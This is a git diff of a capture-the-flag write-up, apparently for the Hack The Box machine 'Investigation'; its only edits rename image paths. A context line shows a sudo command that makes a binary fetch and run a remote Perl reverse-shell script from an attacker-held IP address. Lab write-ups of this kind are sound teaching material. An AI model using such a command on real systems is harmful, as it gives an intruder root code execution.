@@ -30,7 +30,7 @@ Clicking the big Go button reveals that we can upload a jpg file to the website 
 
 When I uploada file, it would produce a link to a report.
 
-<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The file would be a .txt file of output from `exiftool` being used on the file.
 
@@ -140,7 +140,7 @@ Exiting...
 
 So I transferred this binary back to my machine and used `ghidra` to see what it does. Here's the decompiled main function:
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can use this to get these this information:
 
@@ -162,6 +162,6 @@ smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.56/rev.perl lDnxUy
 Running...
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Definitely more on the CTF side of HTB.&#x20;
